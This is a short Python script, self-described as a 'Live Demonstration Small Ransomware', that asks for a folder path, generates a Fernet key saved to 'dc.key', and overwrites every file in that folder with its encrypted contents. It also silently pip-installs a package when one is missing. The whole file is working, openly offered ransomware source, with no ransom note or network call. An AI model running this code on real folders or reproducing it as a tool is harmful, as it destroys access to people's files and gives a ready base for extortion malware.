# --- Coded by Pranshu
# --- Live Demonstration Small Ransomware
# --- Team Sincryption
# --- imports
import os,sys
try:
    import colorama
except ImportError:
    _ = os.system('pip install colorama' if os.name=='nt' else 'pip3 install colorama')
from colorama import Fore
from cryptography.fernet import Fernet
from functools import cache
# ---- colors 

w = Fore.WHITE
g = Fore.GREEN
r = Fore.RED

banner="""
                                                   
@@@  @@@             @@@@@@@   @@@        @@@@@@   
@@@  @@@             @@@@@@@@  @@@       @@@@@@@@  
@@!  !@@             @@!  @@@  @@!       @@!  @@@  
!@!  @!!             !@!  @!@  !@!       !@!  @!@  
 !@@!@!   @!@!@!@!@  @!@@!@!   @!!       @!@  !@!  
  @!!!    !!!@!@!!!  !!@!!!    !!!       !@!  !!!  
 !: :!!              !!:       !!:       !!:  !!!  
:!:  !:!             :!:        :!:      :!:  !:!  
 ::  :::              ::        :: ::::  ::::: ::  
 :   ::               :        : :: : :   : :  :   
\n
<Developer>      Pranshu Pathak      </Developer> """
# --- STart

class Functions:
    def __init__(self):
        self.generate = Fernet.generate_key()
        with open('dc.key','wb') as wrt:
            wrt.write(self.generate)
        with open('dc.key','rb') as wrt:
            self.datas = wrt.read()
        self.final_key = self.datas

    @cache
    def EncryptFiles(self,path):
        self.paths = path
        self.oldpath = os.getcwd()+ '/'
        os.chdir(self.paths)
        for i in os.listdir():
            with open(i,'rb') as read:
                self.first = read.read()
            self.enc = Fernet(self.final_key).encrypt(self.first)
            with open(i,'wb') as writes:
                writes.write(self.enc)
        os.chdir(self.oldpath)
        return r+"Khatam Folder !!!"


class Main(Functions):

    def __init__(self):
        os.system('cls' if os.name=='nt' else 'clear')
        print(banner) 
        print('\n')

    def FunctionReceive(self):
        super().__init__()
        self.finalreply = super().EncryptFiles(self.ques)


MainTeam = Main()
MainTeam.ques = input(w+"Enter the Perfect Folder Path "+r+">> "+g).strip()
MainTeam.FunctionReceive()
print('\n')
print(MainTeam.finalreply)